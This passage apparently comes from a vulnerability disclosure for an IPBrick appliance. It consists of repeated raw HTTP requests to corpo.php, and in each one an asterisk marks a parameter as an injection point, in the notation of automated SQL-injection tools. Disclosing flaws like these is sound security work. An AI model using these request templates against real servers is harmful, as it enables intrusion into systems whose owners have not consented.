name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_placas_pstn_submitdb\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"tipoplaca\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"manufacturer\"\x0d\x0a\x0d\x0a6\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"numportas\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"interface1\"\x0d\x0a\x0d\x0aPSTN*\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"porta1\"\x0d\x0a\x0d\x0aTE PtP\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"inserir\"\x0d\x0a\x0d\x0aInsert\x0d\x0a-----------------------------1263099156734327261671054908--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=gre_alt_acc*&idgre=2&reload=1&control=2&lastrmt=0&name=a&description=b&active=t&lo_ip1=10&lo_ip2=0&lo_ip3=0&lo_ip4=253&li_ip1=192&li_ip2=168&li_ip3=69&li_ip4=199&ro_ip1=1&ro_ip2=1&ro_ip3=1&ro_ip4=12&alterar=Modify
```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=utilizador_ver_lista&offset=0&first_char=&pesq_nome=*
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_placas_pstn_submitdb\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"tipoplaca\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"manufacturer\"\x0d\x0a\x0d\x0a6\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"numportas\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"interface1\"\x0d\x0a\x0d\x0aPSTN\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"porta1\"\x0d\x0a\x0d\x0aTE PtP*\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"inserir\"\x0d\x0a\x0d\x0aInsert\x0d\x0a-----------------------------1263099156734327261671054908--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.ph
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; 